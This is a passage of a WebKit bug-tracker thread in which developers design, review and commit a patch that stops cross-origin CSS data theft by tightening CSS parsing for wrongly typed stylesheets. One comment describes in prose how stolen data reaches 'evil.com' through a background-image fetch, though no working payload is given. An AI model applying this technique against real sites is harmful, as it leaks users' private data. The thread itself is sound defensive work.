        </span>

      </div>




<pre class="bz_comment_text">This is something I continue to fail to have time to look at -- hence the filing of the bug upstream :-/</pre>
    </div>

    <div id="c8" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c8">Comment 8</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-04 14:20:07 PST
        </span>

      </div>




<pre class="bz_comment_text">Yeah, I got a good patch which is both conservatively secure and conservatively compatible. Compatibility has been checked with a run across 500,000 URLs, and in fact the solution was derived from these URLs. I'll upload the patch once I have a good test too :)</pre>
    </div>

    <div id="c9" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c9">Comment 9</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-04 20:38:32 PST
        </span>

      </div>




<pre class="bz_comment_text">Patch to follow, I think it's good. I've done a lot of testing including:
- Full LayoutTests (clean)
- Mining of 500,000 URLs for interesting cross-domain CSS usage. Best I know, the only site affected by this is <a href="http://practiceexam.keys2drive.ca/quiz.php">http://practiceexam.keys2drive.ca/quiz.php</a> which looks slightly different but is still acceptable and usable. Regrettably, this pages uses text/html for a cross-domain CSS load and prefixes valid CSS with &quot;&lt;style&gt;&quot;.
- Turns out that cross-domain text/html with a valid CSS payload, and text/plain with a valid CSS payload does occur (28 occurrences in 500,000 URLs including curiously configure.dell.com)! Therefore this case is accounted for.
- Other common MIME types mistakenly used for cross-domain CSS loads include application/octet-stream (53 / 500,000), application/css (1), application/x-pointplus (1)</pre>
    </div>

    <div id="c10" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c10">Comment 10</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-04 20:39:23 PST
        </span>

      </div>




<pre class="bz_comment_text">Created <span class="bz_obsolete"><a href="attachment.cgi?id=42540&amp;action=diff" name="attach_42540" title="Patch and test">attachment 42540</a> <a href="attachment.cgi?id=42540&amp;action=edit" title="Patch and test">[details]</a></span>
Patch and test</pre>
    </div>

    <div id="c11" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c11">Comment 11</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Adam Barth</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-05 08:22:51 PST
        </span>

      </div>




<pre class="bz_comment_text">Nice idea Chris.  I'm going to let an expert in this area review the actual code, but I like the approach.

Have you shared the approach with the other browser vendors?  It would be best if we all did the same thing.</pre>
    </div>

    <div id="c12" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c12">Comment 12</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Maciej Stachowiak</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-07 19:24:44 PST
        </span>

      </div>




<pre class="bz_comment_text">This looks like a promising approach (have not reviewed the CSS parser details yet).

I'm sorry to bring these to the table late, but here are some other ideas I thought of:

1) For cross-site stylesheet loads, disable Cookies, HTTP Auth, and sending of client-side certs (or perhaps any SSL). Then the only risk is to content that is only protected by a firewall. I'm not sure if this would break anything, but it would depend less on the details of the CSS parser so it may be more robust.

2) For cross-site styleseet loads, if the stylesheet is returned with an incorrect MIME type, disable scripting access to the stylesheet (but still apply the styles). I'm not sure if this would be sufficiently compatible or if it would fully close the hole.

Any thoughts on these?</pre>
    </div>

    <div id="c13" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c13">Comment 13</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Sam Weinig</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-08 14:48:09 PST
        </span>

      </div>




<pre class="bz_comment_text"><span class="quote">&gt; 2) For cross-site styleseet loads, if the stylesheet is returned with an
&gt; incorrect MIME type, disable scripting access to the stylesheet (but still
&gt; apply the styles). I'm not sure if this would be sufficiently compatible or if
&gt; it would fully close the hole.
&gt; </span >

If I am not mistaken, I believe we now always disallow scripting access to cross-site stylesheets. (see <a href="http://trac.webkit.org/changeset/50587">http://trac.webkit.org/changeset/50587</a>).

I am cc'ing hyatt, who would probably be the best person the review the change to the CSS parser.</pre>
    </div>

    <div id="c14" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c14">Comment 14</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Sam Weinig</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-08 14:59:20 PST
        </span>

      </div>




<pre class="bz_comment_text">Comment on <span class="bz_obsolete"><a href="attachment.cgi?id=42540&amp;action=diff" name="attach_42540" title="Patch and test">attachment 42540</a> <a href="attachment.cgi?id=42540&amp;action=edit" title="Patch and test">[details]</a></span>
Patch and test

Not a full review, just some passing comments

- I think we should be using the term crossOrigin instead of crossDomain since we are really talking about the origin tuple, not just the domain.
- I am not a fan of the term &quot;good&quot; in the context you are using it.  What is a &quot;good&quot; header?  What is a &quot;good&quot; CSS rule?  Please be more explicit with those names.
- Is this something we should add a Setting for while it is still experimental?

<span class="quote">&gt; +void
&gt; +CSSParser::invalidBlockHit() {</span >

Two nits.  The &quot;void&quot; should be on the same line as the rest of the function prototype.  The { should be on the next line.</pre>
    </div>

    <div id="c15" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c15">Comment 15</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-08 21:18:29 PST
        </span>

      </div>




<pre class="bz_comment_text">&#64;Sam, <a href="show_bug.cgi?id=29820#c13">comment #13</a>: unfortunately, the referenced change does not prevent script access. It simply stops raw CSS rule text access via the &quot;cssRules&quot; array (bringing WebKit in line with all other browsers). It leaves the getComputedStyle().getPropertyValue() avenue open. And even if we closed that, it's still not good enough, see next comment...

&#64;Sam, <a href="show_bug.cgi?id=29820#c14">comment #14</a>: thanks. I'll use &quot;syntacticallyValid&quot; instead of &quot;good&quot;.</pre>
    </div>

    <div id="c16" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c16">Comment 16</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-08 22:24:03 PST
        </span>

      </div>




<pre class="bz_comment_text">&#64;Maciej, <a href="show_bug.cgi?id=29820#c12">comment #12</a>:

Idea #2 isn't secure. The Yahoo Mail example given does not need script to steal the data. The stolen data is effectively sent to evil.com for the fetch of the background-image URL. There are probably other ways that data can be stolen by monitoring the effects of CSS.

Idea #1 is more interesting. I thought I had a good reason to not go that route, but I seem to have forgotten it. There are certainly sites that rely on cross-origin authenticated &lt;script&gt; loads; I'm not sure about CSS.
Mainly, it would be very challenging to semi-automatically test in the same way as I tested my change.</pre>
    </div>

    <div id="c17" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c17">Comment 17</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-09 22:51:17 PST
        </span>

      </div>




<pre class="bz_comment_text">Hyatt, any thoughts?</pre>
    </div>

    <div id="c18" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c18">Comment 18</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Maciej Stachowiak</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-10 18:36:42 PST
        </span>

      </div>




<pre class="bz_comment_text">(In reply to <a href="show_bug.cgi?id=29820#c16">comment #16</a>)
<span class="quote">&gt; &#64;Maciej, <a href="show_bug.cgi?id=29820#c12">comment #12</a>:
&gt; 
&gt; Idea #2 isn't secure. The Yahoo Mail example given does not need script to
&gt; steal the data. The stolen data is effectively sent to evil.com for the fetch
&gt; of the background-image URL. There are probably other ways that data can be
&gt; stolen by monitoring the effects of CSS.</span >

Good point. I withdraw the idea.
 
<span class="quote">&gt; Idea #1 is more interesting. I thought I had a good reason to not go that
&gt; route, but I seem to have forgotten it. There are certainly sites that rely on
&gt; cross-origin authenticated &lt;script&gt; loads; I'm not sure about CSS.
&gt; Mainly, it would be very challenging to semi-automatically test in the same way
&gt; as I tested my change.</span >

I heard recently that IE no longer sends Cookie headers for cross-site &lt;script&gt; loads, which is what made me think of the idea for styles. I think we should consider #1 if it turns out to be sufficiently compatible, perhaps in combination with your change.

I will try to get someone with CSS parser knowledge to look at your patch.</pre>
    </div>

    <div id="c19" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c19">Comment 19</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-10 18:48:40 PST
        </span>

      </div>




<pre class="bz_comment_text">Where did you hear that IE doesn't sent cookies for cross-site &lt;script&gt; loads? Maybe you're thinking of Gazelle?

I spoke with Charlie Reis recently and we talked about just this. A lot of sites unfortunately depend on it. <a href="https://pip.verisignlabs.com/">https://pip.verisignlabs.com/</a> was the example given. I've not checked myself, but Charlie is pretty reliable.

The reason I prefer the &quot;stricter CSS&quot; approach is that sites are welcome to depend on cookies being sent for cross-origin CSS, and it's not an unreasonable thing to do. On the other hand, it's not reasonable for sites to load cross-origin CSS with bust-up MIME types with a CSS syntax error preceeding valid CSS.

However, I would of course be delighted if we could just not send cookies for cross-site script, CSS etc. I just think it'll break stuff. May be worth an experiment in the future...</pre>
    </div>

    <div id="c20" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c20">Comment 20</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Dave Hyatt</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-11 10:54:01 PST
        </span>

      </div>




<pre class="bz_comment_text">Comment on <span class="bz_obsolete"><a href="attachment.cgi?id=42540&amp;action=diff" name="attach_42540" title="Patch and test">attachment 42540</a> <a href="attachment.cgi?id=42540&amp;action=edit" title="Patch and test">[details]</a></span>
Patch and test

You need to patch XML processing instructions also, and there needs to be a test for those.</pre>
    </div>

    <div id="c21" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c21">Comment 21</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-11 11:24:20 PST
        </span>

      </div>




<pre class="bz_comment_text">I agree the need to test XML processing instructions. I'll get on that.
However, I don't think a code change is needed because &quot;strict&quot; mode is enforced, which requires a valid CSS MIME type. This is certainly subtle -- strict mode is used because of a defaulted C++ parameter, so I'll add a comment.</pre>
    </div>

    <div id="c22" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c22">Comment 22</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-11 14:39:15 PST
        </span>

      </div>




<pre class="bz_comment_text">Created <span class=""><a href="attachment.cgi?id=43007&amp;action=diff" name="attach_43007" title="Address all comments from review">attachment 43007</a> <a href="attachment.cgi?id=43007&amp;action=edit" title="Address all comments from review">[details]</a></span>
Address all comments from review</pre>
    </div>

    <div id="c23" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c23">Comment 23</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-11 14:43:24 PST
        </span>

      </div>




<pre class="bz_comment_text">New patch updated, featuring:
- Fixes Sam's naming and style comments.
- Adds a test for the CSS in XML case noted by Dave.
- Adds a comment and makes the &quot;strict&quot; mode of CSS in XML more explicit.
- Tweaks one of the tests to check that a semantically invalid descriptor (i.e. contains unknown property) loads OK.
- Better ChangeLog entry.</pre>
    </div>

    <div id="c24" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c24">Comment 24</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-13 15:46:16 PST
        </span>

      </div>




<pre class="bz_comment_text">Ping? I'm now away until Tuesday, and then limited availability for Tues &amp; Weds prior to three weeks away. I'd rather not lose this small window for landing this.</pre>
    </div>

    <div id="c25" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c25">Comment 25</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Dave Hyatt</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-16 14:46:40 PST
        </span>

      </div>




<pre class="bz_comment_text">Comment on <span class=""><a href="attachment.cgi?id=43007&amp;action=diff" name="attach_43007" title="Address all comments from review">attachment 43007</a> <a href="attachment.cgi?id=43007&amp;action=edit" title="Address all comments from review">[details]</a></span>
Address all comments from review

The CSSParser changes seems iffy to me.  Why limit to just a &quot;header&quot; check?  What if you hit an invalid block first and then hit some valid rules following the invalid block?

What is the point of the extra enforceMIMEType argument to parseString?  It looks like it matches whether or not you're using strictParsing always, so I don't get the point of it.</pre>
    </div>

    <div id="c26" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c26">Comment 26</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Dave Hyatt</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-16 14:57:58 PST
        </span>

      </div>




<pre class="bz_comment_text">That previous comment about enforceMIMEType may not have been totally clear.  I'm specifically wondering about CSSImportRule.  It looks like enforceMIMEType is never being checked against the setting:

HTMLLinkElement has the following code:

if (enforceMIMEType &amp;&amp; document()-&gt;page() &amp;&amp; !document()-&gt;page()-&gt;settings()-&gt;enforceCSSMIMETypeInStrictMode())
    enforceMIMEType = false;

This check was really only necessary for iWeb, and we didn't bother pushing it into import rules.  You added the enforceMIMEType variable to the CSSImportRule check but then didn't bother doing anything with it, so it just matches strictParsing.

I don't see a need for that check in sub-stylesheets, so please just get rid of enforceMIMEType in CSSImportRule.</pre>
    </div>

    <div id="c27" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c27">Comment 27</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-17 18:31:14 PST
        </span>

      </div>




<pre class="bz_comment_text">Thanks for taking a detailed look, Dave.

&#64;25: &quot;The CSSParser changes seems iffy to me.  Why limit to just a &quot;header&quot; check? 
What if you hit an invalid block first and then hit some valid rules following
the invalid block?&quot;

The attacker, unfortunately, can easily inject some valid rules after some preceding junk. So in that case (invalid block then valid rules), we must reject. 


&#64;26: I probably need to simply think about this some more, but I'm not sure I understand the suggestion yet. &quot;enforceMIMEType&quot; is a renaming of &quot;strict&quot; to make the variable name clearer. I've tried to minimally disturb the logic from the existing state. All I've done, really, is engage &quot;strict&quot; mode if there is cross-origin CSS loading that does not start with what looks like CSS.</pre>
    </div>

    <div id="c28" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c28">Comment 28</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-11-29 21:35:08 PST
        </span>

      </div>




<pre class="bz_comment_text">Any thoughts re: my <a href="show_bug.cgi?id=29820#c27">comment #27</a>?

If there are still concerns, perhaps we should schedule lunch &#64; Apple to finally land this thing? I'm currently on vacation but Weds 9th Dec would work. I don't want to delay some form of landed solution too close to the Dec 28th deadline.</pre>
    </div>

    <div id="c29" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c29">Comment 29</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-12-08 14:29:41 PST
        </span>

      </div>




<pre class="bz_comment_text">&#64;26: I've now had the time to have a more thorough look. I believe the only logic change I made is to add the cross-domain check.
Perhaps the confusion is the rename of &quot;strict&quot; to the more descriptive &quot;enforceMIMEType&quot;. So, &quot;enforceMIMEType&quot; is definitely used -- and used with the exact same logic as before the patch.</pre>
    </div>

    <div id="c30" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c30">Comment 30</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Dave Hyatt</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-12-14 10:00:00 PST
        </span>

      </div>




<pre class="bz_comment_text">&quot;(In reply to <a href="show_bug.cgi?id=29820#c27">comment #27</a>)
&gt;
<span class="quote">&gt; &#64;26: I probably need to simply think about this some more, but I'm not sure I
&gt; understand the suggestion yet. &quot;enforceMIMEType&quot; is a renaming of &quot;strict&quot; to
&gt; make the variable name clearer. I've tried to minimally disturb the logic from
&gt; the existing state. All I've done, really, is engage &quot;strict&quot; mode if there is
&gt; cross-origin CSS loading that does not start with what looks like CSS.</span >

Except you haven't made it clearer.  That variable name is wrong in that context, and the change is unnecessary.   Look at HTMLLinkElement:

m_sheet-&gt;parseString(sheetText, strictParsing);

Now look at what you did in CSSImportRule:

m_styleSheet-&gt;parseString(sheetText, enforceMIMEType);

The argument to parseString is whether or not CSS Is using strict parsing.  It's not just about MIME type enforcement.  You just didn't need to introduce that variable name here, since that variable was only introduced as a local in the other spot so that it could be set to false if the setting was present.</pre>
    </div>

    <div id="c31" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c31">Comment 31</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-12-14 16:07:39 PST
        </span>

      </div>




<pre class="bz_comment_text">Thanks, Dave. I see and agree with the concern now.

I fixed it, but ironically, I discovered upon &quot;svn update&quot; that <a href="https://commits.webkit.org/r52032">r52032</a> actually introduces a split of &quot;strict&quot; vs. &quot;enforeMIMEType&quot; to the CSS import code. I'm doing a manual merge now and will post an updated patch shortly.</pre>
    </div>

    <div id="c32" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c32">Comment 32</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-12-14 18:02:27 PST
        </span>

      </div>




<pre class="bz_comment_text">Created <span class=""><a href="attachment.cgi?id=44830&amp;action=diff" name="attach_44830" title="Latest patch -- merge with WebKit head">attachment 44830</a> <a href="attachment.cgi?id=44830&amp;action=edit" title="Latest patch -- merge with WebKit head">[details]</a></span>
Latest patch -- merge with WebKit head</pre>
    </div>

    <div id="c33" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c33">Comment 33</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-12-14 18:06:14 PST
        </span>

      </div>




<pre class="bz_comment_text">Ok, updated patch attached.
Note that &quot;enforceMIMEType&quot; was introduced by (completely unrelated) <a href="https://commits.webkit.org/r52032">r52032</a>. This makes the latest patch smaller, and sort of cancels the clarified complaint in <a href="show_bug.cgi?id=29820#c30">comment #30</a> :)

Any further changes you would like?</pre>
    </div>

    <div id="c34" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c34">Comment 34</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-12-17 21:09:13 PST
        </span>

      </div>




<pre class="bz_comment_text">Friendly ping? :)</pre>
    </div>

    <div id="c35" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c35">Comment 35</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2009-12-31 01:12:53 PST
        </span>

      </div>




<pre class="bz_comment_text">Now public, via Mozilla checkin and my blog.
Unless there are further comments on the patch, can we get this landed?</pre>
    </div>

    <div id="c36" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c36">Comment 36</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Adam Barth</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2010-01-04 15:10:37 PST
        </span>

      </div>




<pre class="bz_comment_text">Comment on <span class=""><a href="attachment.cgi?id=44830&amp;action=diff" name="attach_44830" title="Latest patch -- merge with WebKit head">attachment 44830</a> <a href="attachment.cgi?id=44830&amp;action=edit" title="Latest patch -- merge with WebKit head">[details]</a></span>
Latest patch -- merge with WebKit head

Chris appears to have addressed hyatt's concerns.  This security issue is public now and needs to get fixed as soon as possible.  The discussion on this bug seems to have stalled.

As far as I can tell, the patch seems fine.  Marking as review+.  If you have concerns, let me know.  If we need to iterate on this after landing, we can do that too.</pre>
    </div>

    <div id="c37" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c37">Comment 37</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Adam Barth</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2010-01-04 21:20:06 PST
        </span>

      </div>




<pre class="bz_comment_text">Committed <a href="https://commits.webkit.org/r52784">r52784</a>: &lt;<a href="http://trac.webkit.org/changeset/52784">http://trac.webkit.org/changeset/52784</a>&gt;</pre>
    </div>

    <div id="c38" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=29820#c38">Comment 38</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Chris Evans</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2010-08-09 16:01:14 PDT
        </span>

      </div>




<pre class="bz_comment_text">Un-hiding; all very public by now and I want to fix the link from <a href="http://www.owlfolio.org/htmletc/css-data-theft/">http://www.owlfolio.org/htmletc/css-data-theft/</a></pre>
    </div>


  

</td>
<td>
</td>
</tr></table>
  </div>
        

</form>

<hr>
<ul class="related_actions">
    <li><a href="show_bug.cgi?format=multiple&amp;id=29820">Format For Printing</a></li>
    <li>&nbsp;-&nbsp;<a href="show_bug.cgi?ctype=xml&amp;id=29820">XML</a></li>
    <li>&nbsp;-&nbsp;<a href="enter_bug.cgi?cloned_bug_id=29820">Clone This Bug</a></li>
    
    <li>&nbsp;-&nbsp;<a href="#">Top of page </a></li>
    </ul>

<br>
</div>

    <div id="footer">
      <div class="intro"></div>
<ul id="useful-links">
  <li id="links-actions"><ul class="links">
  <li><a href="./">Home</a></li>
  <li><span class="separator">| </span><a href="enter_bug.cgi">New</a></li>
  <li><span class="separator">| </span><a href="describecomponents.cgi">Browse</a></li>
  <li><span class="separator">| </span><a href="query.cgi">Search</a></li>

  <li class="form">
    <span class="separator">| </span>
    <form action="buglist.cgi" method="get"
        onsubmit="if (this.quicksearch.value == '')
                  { alert('Please enter one or more search terms first.');
                    return false; } return true;">
    <input type="hidden" id="no_redirect_bottom" name="no_redirect" value="0">
    <script type="text/javascript">
      if (history && history.replaceState) {
        var no_redirect = document.getElementById("no_redirect_bottom");
        no_redirect.value = 1;
      }
    </script>
    <input class="txt" type="text" id="quicksearch_bottom" name="quicksearch" 
           title="Quick Search" value="">
    <input class="btn" type="submit" value="Search" 
           id="find_bottom"></form>
  <a href="page.cgi?id=quicksearch.html" title="Quicksearch Help">[?]</a></li>

  <li><span class="separator">| </span><a href="report.cgi">Reports</a></li>

  <li>
      <span class="separator">| </span>
        <a href="request.cgi">Requests</a></li>


  <li>
        <span class="separator">| </span>
        <a href="https://bugzilla.readthedocs.org/en/5.0/using/understanding.html" target="_blank">Help</a>
      </li>
    
      <li id="new_account_container_bottom">
        <span class="separator">| </span>
        <a href="createaccount.cgi">New&nbsp;Account</a>
      </li>

    <li id="mini_login_container_bottom">
  <span class="separator">| </span>
  <a id="login_link_bottom" href="show_bug.cgi?id=29820&amp;GoAheadAndLogIn=1"
     onclick="return show_mini_login_form('_bottom')">Log In</a>

  <form action="show_bug.cgi?id=29820" method="POST"
        class="mini_login bz_default_hidden"
        id="mini_login_bottom">
    <input id="Bugzilla_login_bottom" required
           name="Bugzilla_login" class="bz_login"
        type="email" placeholder="Email Address">
    <input class="bz_password" name="Bugzilla_password" type="password"
           id="Bugzilla_password_bottom" required
           placeholder="Password">
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
            id="log_in_bottom">
    <a href="#" onclick="return hide_mini_login_form('_bottom')">[x]</a>
  </form>
</li>


  <li id="forgot_container_bottom">
    <span class="separator">| </span>
    <a id="forgot_link_bottom" href="show_bug.cgi?id=29820&amp;GoAheadAndLogIn=1#forgot"
       onclick="return show_forgot_form('_bottom')">Forgot Password</a>
    <form action="token.cgi" method="post" id="forgot_form_bottom"
          class="mini_forgot bz_default_hidden">
      <label for="login_bottom">Login:</label>
      <input name="loginname" size="20" id="login_bottom" required
          type="email" placeholder="Your Email Address">
      <input id="forgot_button_bottom" value="Reset Password" type="submit">
      <input type="hidden" name="a" value="reqpw">
      <input type="hidden" id="token_bottom" name="token"
             value="1635620813-yEQfQ8DcbK5Gl4x8ATqRYcmSIc0SOPK23SDU2MwRGOc">
      <a href="#" onclick="return hide_forgot_form('_bottom')">[x]</a>
    </form>
  </li>
</ul>
  </li>

  




  
</ul>

      <div class="outro"></div>
    </div>

    <!-- WEBKIT_CHANGES -->
    <script defer src="/committers-autocomplete.js"></script>
  </body>
</html>